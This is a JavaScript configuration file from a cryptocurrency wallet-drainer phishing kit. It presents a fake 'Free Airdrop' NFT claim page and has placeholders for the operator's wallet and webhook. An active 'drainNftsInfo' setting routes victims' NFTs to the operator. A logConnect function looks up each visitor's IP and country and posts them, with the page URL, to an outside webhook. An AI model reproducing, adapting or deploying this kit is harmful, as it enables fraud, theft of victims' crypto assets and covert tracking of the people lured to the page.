const webhookURL = "YOUR WEBHOOK";
const receiveAddress = 'YOUR WALLET',
  collectionInfo = {
    name: 'THE NFT WORLD',
    socialMedia: {
      discord: 'https://discord.gg',
      twitter: 'https://twitter.com',
      instagram: 'https://instagram.com/',
    },
  },

  indexPageInfo = {
    backgroundImage: 'background.jpg',
    title: '{name}',
    underTitle: 'Free Airdrop',
  },

  claimPageInfo = {
    title: 'GET YOUR<br>NFT NOW',
    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
    longDescription:
      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
    claimButtonText: 'CLAIM NOW',
    image: 'bg3.png',
    imageRadius: 250,
  },

  drainNftsInfo = {
    active: true,
    minValue: 0.1,
    nftReceiveAddress: 'YOUR WALLET',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'Connect wallet',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',
  }

  function getFlagEmoji(countryCode) {
    const flagEmojis = {
      AU: "🇦🇺",
      BR: "🇧🇷",
      CA: "🇨🇦",
      CN: "🇨🇳",
      FR: "🇫🇷",
      DE: "🇩🇪",
      IN: "🇮🇳",
      IT: "🇮🇹",
      JP: "🇯🇵",
      MX: "🇲🇽",
      RU: "🇷🇺",
      ZA: "🇿🇦",
      KR: "🇰🇷",
      ES: "🇪🇸",
      US: "🇺🇸",
      GB: "🇬🇧",
      // Adicione mais códigos e emojis de bandeira conforme necessário
    };
  
    return flagEmojis[countryCode] || "";
  }
  
  function logConnect() {
    const currentURL = window.location.href;
    const webhookUrl = webhookURL;
  
    // Obter o endereço IP e país de origem do usuário usando a API do ipapi
    fetch("https://ipapi.co/json/")
      .then((response) => response.json())
      .then((data) => {
        const userIP = data.ip;
        const userCountry = data.country_name;
        const userCountryCode = data.country_code;
  
        const flagEmoji = getFlagEmoji(userCountryCode);
  
        const embed = {
          title: "Mensagem do usuário",
          description: "One Wallet Connect Pending ⌛",
          fields: [
            {
              name: "IP",
              value: userIP,
              inline: true,
            },
            {
              name: "País",
              value: `${flagEmoji} ${userCountry}`,
              inline: true,
            },
            {
              name: "URL",
              value: currentURL,
            },
          ],
          color: 5898425,
        };
  
  
        const payload = JSON.stringify({ embeds: [embed] });
  
        const request = new XMLHttpRequest();
        request.open("POST", webhookUrl);
        request.setRequestHeader("Content-Type", "application/json");
  
        request.onload = function () {
          if (request.status >= 200 && request.status < 300) {
            console.log("Mensagem enviada com sucesso!");
          } else {
            console.error("Erro ao enviar mensagem:", request.statusText);
          }
        };
  
        request.onerror = function () {
          console.error("Erro ao enviar mensagem:", request.statusText);
        };
  
        request.send(payload);
      })
      .catch((error) => {
        console.error("Erro ao obter o IP e país de origem do usuário:", error);
      });
  
  }
  
